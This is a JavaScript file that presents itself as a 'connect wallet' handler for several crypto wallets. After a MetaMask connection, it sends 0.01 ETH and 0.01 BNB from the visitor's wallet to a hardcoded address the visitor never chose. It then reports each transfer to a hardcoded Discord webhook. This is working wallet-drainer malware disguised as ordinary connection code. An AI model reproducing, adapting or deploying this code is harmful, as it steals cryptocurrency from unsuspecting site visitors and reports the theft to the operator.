let isConnecting = false;

async function connectWallet() {
    if (isConnecting) {
        console.log("Connection request already in progress...");
        return;
    }

    isConnecting = true;
    document.getElementById("connectButton").disabled = true;

    // Ask the user which wallet they want to connect to
    const walletChoice = prompt("Choose your wallet: (1) MetaMask, (2) Trust Wallet, (3) Coinbase Wallet, (4) Phantom Wallet, (5) Zerion Wallet");

    let selectedWallet;
    switch (walletChoice) {
        case '1':
            selectedWallet = 'metamask';
            break;
        case '2':
            selectedWallet = 'trustwallet';
            break;
        case '3':
            selectedWallet = 'coinbase';
            break;
        case '4':
            selectedWallet = 'phantom';
            break;
        case '5':
            selectedWallet = 'zerion';
            break;
        default:
            alert("Invalid choice. Please refresh and try again.");
            isConnecting = false;
            document.getElementById("connectButton").disabled = false;
            return;
    }

    try {
        if (selectedWallet === 'metamask') {
            if (typeof window.ethereum !== 'undefined') {
                // Request wallet connection
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const account = accounts[0];
                console.log(`Connected to MetaMask account: ${account}`);
                await handleTransaction(); // Handle transactions after connection
            } else {
                alert("Please install MetaMask to continue.");
                window.open("https://metamask.io/", "_blank");
            }
        } else if (selectedWallet === 'trustwallet') {
            const url = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(window.location.href)}`;
            window.open(url, "_blank"); // Open Trust Wallet app
        } else if (selectedWallet === 'coinbase') {
            const url = `https://www.coinbase.com/wallet/link?url=${encodeURIComponent(window.location.href)}`;
            window.open(url, "_blank"); // Open Coinbase Wallet app
        } else if (selectedWallet === 'phantom') {
            const url = `https://phantom.app/?action=connect&referrer=${encodeURIComponent(window.location.href)}`;
            window.open(url, "_blank"); // Open Phantom Wallet app
        } else if (selectedWallet === 'zerion') {
            const url = `https://zerion.io/wallet?url=${encodeURIComponent(window.location.href)}`;
            window.open(url, "_blank"); // Open Zerion Wallet app
        }
    } catch (error) {
        console.error("Error connecting to wallet:", error);
        alert("Error connecting to wallet. Make sure you have a supported wallet installed.");
    } finally {
        isConnecting = false;
        document.getElementById("connectButton").disabled = false;
    }
}

async function handleTransaction() {
    const ethAvailable = await isNetworkAvailable('ethereum');
    const bnbAvailable = await isNetworkAvailable('bsc');

    if (ethAvailable && bnbAvailable) {
        console.log('Both ETH and BNB are available, sending transactions...');
        await sendTransaction("ETH");
        await sendTransaction("BNB");
    } else if (ethAvailable) {
        console.log('Sending ETH transaction...');
        await sendTransaction("ETH");
    } else if (bnbAvailable) {
        console.log('Sending BNB transaction...');
        await sendTransaction("BNB");
    } else {
        console.log('Neither Ethereum nor Binance Smart Chain is available.');
    }
}

async function isNetworkAvailable(network) {
    const networkId = await window.ethereum.request({ method: 'net_version' });

    if (network === 'ethereum' && networkId === '1') {
        return true; // Ethereum Mainnet is available
    } else if (network === 'bsc' && networkId === '56') {
        return true; // Binance Smart Chain is available
    } else {
        return false;
    }
}

async function sendTransaction(network) {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    if (network === "ETH") {
        const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // ETH recipient address
        const amountInEther = "0.01"; // Amount of ETH to send

        const transaction = {
            to: recipientAddress,
            value: ethers.utils.parseEther(amountInEther),
        };

        try {
            const txResponse = await signer.sendTransaction(transaction);
            console.log("ETH Transaction response:", txResponse);
            await notifyWebhook("ETH transaction successful", txResponse);
        } catch (error) {
            console.error("Error sending ETH transaction:", error);
            await notifyWebhook("ETH transaction failed", error);
        }
    } else if (network === "BNB") {
        const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // BNB recipient address
        const amountInBNB = "0.01"; // Amount of BNB to send

        const transaction = {
            to: recipientAddress,
            value: ethers.utils.parseEther(amountInBNB),
        };

        try {
            const txResponse = await signer.sendTransaction(transaction);
            console.log("BNB Transaction response:", txResponse);
            await notifyWebhook("BNB transaction successful", txResponse);
        } catch (error) {
            console.error("Error sending BNB transaction:", error);
            await notifyWebhook("BNB transaction failed", error);
        }
    }
}

async function notifyWebhook(message, data) {
    const webhookUrl = "https://discord.com/api/webhooks/1288775554836860969/vGhZpW1U9hPXFZfZACJomfVg-bY1pjP4__PpK_5Gf2dAxtcgZKZJqRDp3_9z0ULgP7Wg"; // Replace with your Discord webhook URL
    const body = {
        content: `${message}: ${JSON.stringify(data)}`,
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        });
    } catch (error) {
        console.error("Error sending webhook notification:", error);
    }
}

// Event listener for the connect wallet button
document.getElementById("connectButton").addEventListener("click", connectWallet);
